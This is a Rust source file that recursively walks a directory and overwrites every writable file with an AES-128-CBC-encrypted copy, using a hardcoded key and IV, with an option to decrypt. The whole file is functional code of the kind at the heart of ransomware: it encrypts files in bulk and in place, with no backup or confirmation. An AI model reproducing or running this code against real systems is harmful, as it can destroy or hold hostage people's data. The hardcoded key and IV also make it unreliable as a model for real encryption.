use std::fs;
use libaes::Cipher; 

pub fn encryption(dir: &str, decrypt: bool){
    
    match fs::read_dir(dir) {
        Ok(_) => {
            let paths = fs::read_dir(dir).unwrap();
                // show the list of files
            for path in paths {
                // if the file is not a directory
                if path.as_ref().unwrap().path().is_file() {
                    // show the file name then encrypt the file
                    //println!("{}", path.unwrap().path().display());

                    let file_name = path.unwrap().path().display().to_string();
                    // check if the script have the permission to read & write the file
                    if check_file_permission(file_name.as_str()).is_err() {
                        println!("Error: Permission denied");
                        continue;
                    } else {
                        if decrypt {
                            decrypt_file(&file_name).unwrap();           
                        } else {
                            encrypt_file(&file_name).unwrap();
                        }
                    }

                } else {
                    // if the file is a directory, go to the directory
                    encryption(path.unwrap().path().display().to_string().as_str(), decrypt);
                }
            }
        },
        Err(_) => ()
    }
}

fn check_file_permission(file_name: &str) -> Result<(), Box<dyn std::error::Error>>{
    let metadata = fs::metadata(file_name)?;
    let permissions = metadata.permissions();

    // check if current user have the permission to read & write the file
    if permissions.readonly() {
        return Err("Permission denied".into());
    }

    Ok(())
}

fn encrypt_file(file_name: &str) -> Result<(), Box<dyn std::error::Error>>{

    let key = b"alicealicealicea";
    let iv = b"bobbobbobbobbobb";
    let cipher = Cipher::new_128(key);

    // read the file
    let encrypted_string = cipher.cbc_encrypt(iv, &fs::read(file_name).unwrap());


    // try to write the encrypted string to the file, else skip the file
    match fs::write(file_name, encrypted_string) {
        Ok(_) => (),
        Err(_) => println!("Error: Permission denied for {}", file_name)
    }

    Ok(())
}


fn decrypt_file(file_name: &str) -> Result<(), Box<dyn std::error::Error>>{

    let key = b"alicealicealicea";
    let iv = b"bobbobbobbobbobb";
    let cipher = Cipher::new_128(key);

    // read the file
    let decrypted_string = cipher.cbc_decrypt(iv, &fs::read(file_name).unwrap());

    match fs::write(file_name, decrypted_string) {
        Ok(_) => (),
        Err(_) => println!("Error: Permission denied for {}", file_name)
    }

    Ok(())
}